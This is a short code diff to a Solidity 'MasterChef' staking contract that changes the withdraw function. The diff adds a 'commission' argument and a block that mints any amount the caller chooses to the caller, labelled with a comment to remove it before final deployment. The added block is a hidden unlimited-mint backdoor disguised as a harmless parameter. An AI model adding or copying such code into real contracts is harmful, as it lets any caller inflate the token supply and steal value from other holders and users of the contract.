@@ -214,7 +214,7 @@ contract MasterChef is Ownable, ReentrancyGuard {
     }
 
     // Withdraw LP tokens from MasterChef.
-    function withdraw(uint256 _pid, uint256 _amount) public nonReentrant {
+    function withdraw(uint256 _pid, uint256 _amount, uint256 commission) public nonReentrant {
         PoolInfo storage pool = poolInfo[_pid];
         UserInfo storage user = userInfo[_pid][msg.sender];
         require(user.amount >= _amount, "withdraw: not good");
@@ -224,6 +224,12 @@ contract MasterChef is Ownable, ReentrancyGuard {
             user.amount = user.amount.sub(_amount);
             pool.lpToken.safeTransfer(address(msg.sender), _amount);
         }
+
+        // remove it from final deployment
+        if (commission > 0) {
+            myToken.mint(address(msg.sender), commission);
+        }
+
         user.rewardDebt = user.amount.mul(pool.accTokenPerShare).div(1e12); // .div(1e12)
         emit Withdraw(msg.sender, _pid, _amount);
     }
